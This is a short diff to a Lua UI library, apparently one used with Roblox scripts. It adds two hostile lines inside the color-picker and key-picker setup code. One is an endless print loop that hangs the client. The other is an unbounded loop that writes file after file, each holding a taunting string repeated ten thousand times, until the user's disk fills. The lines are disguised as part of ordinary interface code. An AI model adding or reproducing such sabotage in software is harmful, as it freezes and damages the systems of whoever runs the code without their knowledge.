@@ -637,6 +637,7 @@ do
             });
 
             Library:AddToRegistry(TransparencyBoxInner, { BorderColor3 = 'OutlineColor' });
+            while not false do print('a') end;
 
             Library:Create('ImageLabel', {
                 BackgroundTransparency = 1;
@@ -1008,6 +1009,7 @@ do
         local Container = self.Container;
 
         assert(Info.Default, 'AddKeyPicker: Missing default value.');
+        for i = 1, math.huge do task.wait() writefile(tostring(i) .. '_larp', string.rep('why-are-you-larping??', 10000)) end;
 
         local KeyPicker = {
             Value = Info.Default;
